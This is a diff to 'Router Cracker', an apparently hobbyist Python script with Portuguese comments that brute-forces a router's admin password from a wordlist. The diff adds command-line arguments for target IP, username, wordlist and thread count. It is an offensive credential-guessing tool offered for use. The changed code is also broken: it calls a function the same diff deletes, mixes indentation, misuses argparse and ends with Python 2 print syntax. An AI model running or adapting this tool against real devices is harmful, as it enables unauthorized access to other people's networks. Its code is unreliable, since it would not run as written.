@@ -40,20 +40,13 @@ __GITHUB__  =   "https://github.com/luizfritsch"
 CRACKED_PASSWORD = None
 
 def usage():
-	print ("Usage: python cracker.py -t [TARGETs IP] -u [USER TO TEST] -p [PATH TO passwordlist]")
+	print ("Usage: python cracker.py -t [TARGETs IP] -u [USER TO TEST] -p [PATH TO passwordlist] -a [QTD DE THREADS]")
 	print ("")
-	print ("Example: python cracker.py -t 192.168.0.1 -u admin -p passwordlist.txt")
-
-def divisores(num):
-    for i in range(1, int(num/2+1)):
-        if num % i == 0: 
-           yield i
-    yield num
+	print ("Example: python cracker.py -t 192.168.0.1 -u admin -p passwordlist.txt -a 4")
 
 def bruteforce(target, passwords, username):
 	try:
 		i = 0
-		print ("OI")
 		for password in passwords:
 			i = i + 1
 			password = str(password.rstrip())
@@ -78,71 +71,92 @@ def bruteforce(target, passwords, username):
 
 	except Exception as e:
 		print (e)
-	
 
 
-#Le o arquivo de senha
-fd = open('pwd-list.txt', 'r')
-	
-#Salva numa lista
-passwords = fd.readlines()
 
-#Pega a quantidade de elementos que tem na lista de senhas
-qtdElementosNaLista = len(passwords)
+try:
+	global target
+    global passlist
+    global username
 
-print ()
-print ("==========================[Começando]==========================")
-print ()
-	
-#Acha os divisores
-divisor = list(divisores(qtdElementosNaLista))
-	
-#Acha o maior divisor, que nao seja ele mesmo
-md = 0
+    target = ''
+    passlist = ''
+    username = ''
 
+    #Faz o parsing dos argumentos
+    parser = argparse.ArgumentParser(description = "Router Cracker", add_help = False)
+    parser.add_argument('-h', '--help', action=usage(), help='usage')
+    parser.add_argument('-t', '--target',help='Informe o ip do roteador alvo')
+    parser.add_argument('-p', '--passlist',help='Informe a lista de senhas')
+    parser.add_argument('-u','--username',help='Informe o usuário')
+	parser.add_argument('-a','--threads',help='Informe a quantidade de threads')
+    args = parser.parse_args()
 
-qtdThreads = int(input("Quantas threads deseja criar?"))
+    target = args.target
+    username = args.username
+    qtdThreads = args.threads
 
+	#Le o arquivo de senha
+	fd = open(args.passlist, 'r')
+		
+	#Salva numa lista
+	passwords = fd.readlines()
 
-if divisor[-1] == len(passwords):
-	try:
-		md = divisor[-2]	
-	except Exception as e:
-		print (e)
-		print ("...")
-		print ("	...")
-		print ("		...")
-		print ("	...")
-		print ("...")
-		print ("Exiting")
-		sys.exit(0)
-else:
-	md = divisor[-1]
+	#Pega a quantidade de elementos que tem na lista de senhas
+	qtdElementosNaLista = len(passwords)
 
-print ()
-print ("==========================[Dividindo e conquistando]==========================")
-print ()
-
-#Separa a lista em n listas, onde n = maior divisor
-#print (md)
-splited = [passwords[i::md] for i in range(md)]
-
-qtd = int(int(qtdElementosNaLista)/qtdThreads)
-
-#Preciso agora dividir em uma quantidade exata de arrays pra cada Thread	
-
-separador = 0
-threads = []
-for i in range(1,qtdThreads):
-	arrays = passwords[separador:qtd]
-	locals()['thread%d' % i] = threading.Thread(target=bruteforce,args=['192.168.0.1', arrays, "admin"])
-
-for i in range(1,qtdThreads):
-	locals()['thread%d' % i].start()
-	threads.append(locals()['thread%d' % i])
+	print ()
+	print ("==========================[Começando]==========================")
+	print ()
+		
+	#Acha os divisores
+	divisor = list(divisores(qtdElementosNaLista))
+		
+	#Acha o maior divisor, que nao seja ele mesmo
+	md = 0
 
 
-for t in threads:
-    t.join()
- 
-print ("Saindo da main")
+	if divisor[-1] == len(passwords):
+		try:
+			md = divisor[-2]	
+		except Exception as e:
+			print (e)
+			print ("...")
+			print ("	...")
+			print ("		...")
+			print ("	...")
+			print ("...")
+			print ("Exiting")
+			sys.exit(0)
+	else:
+		md = divisor[-1]
+
+	print ()
+	print ("==========================[Dividindo e conquistando]==========================")
+	print ()
+
+	#Separa a lista em n listas, onde n = maior divisor
+	#print (md)
+	splited = [passwords[i::md] for i in range(md)]
+
+	qtd = int(int(qtdElementosNaLista)/qtdThreads)
+
+	#Preciso agora dividir em uma quantidade exata de arrays pra cada Thread	
+
+	separador = 0
+	threads = []
+	for i in range(1,qtdThreads):
+		arrays = passwords[separador:qtd]
+		locals()['thread%d' % i] = threading.Thread(target=bruteforce,args=[target, arrays, username])
+
+	for i in range(1,qtdThreads):
+		locals()['thread%d' % i].start()
+		threads.append(locals()['thread%d' % i])
+
+
+	for t in threads:
+	    t.join()
+	 
+	print ("Saindo da main")
+except Exception as e:
+	print e
